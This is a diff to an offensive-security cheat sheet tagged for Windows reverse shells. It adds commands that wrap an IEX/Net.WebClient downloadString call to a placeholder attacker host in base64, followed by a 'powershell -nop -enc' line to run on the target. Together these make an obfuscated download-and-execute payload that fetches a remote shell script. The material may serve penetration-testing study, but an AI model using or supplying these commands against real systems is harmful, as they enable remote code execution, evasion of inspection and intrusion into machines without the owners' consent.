@@ -1,4 +1,10 @@
-% encode
+% revshell, windows, encode
 
 # convert powershell script to b64
 cat <script> | iconv -t utf-16le | base64 -w 0
+
+# Download and execute powershell script as b64 payload
+echo "On linux attack machine"
+echo -n "IEX(New-Object Net.WebClient).downloadString('http://<attackerip>/<shell>.ps1')" | iconv -t UTF-16LE | base64 -w 0
+echo "On windows target"
+echo "powershell -nop -enc (Base64)"
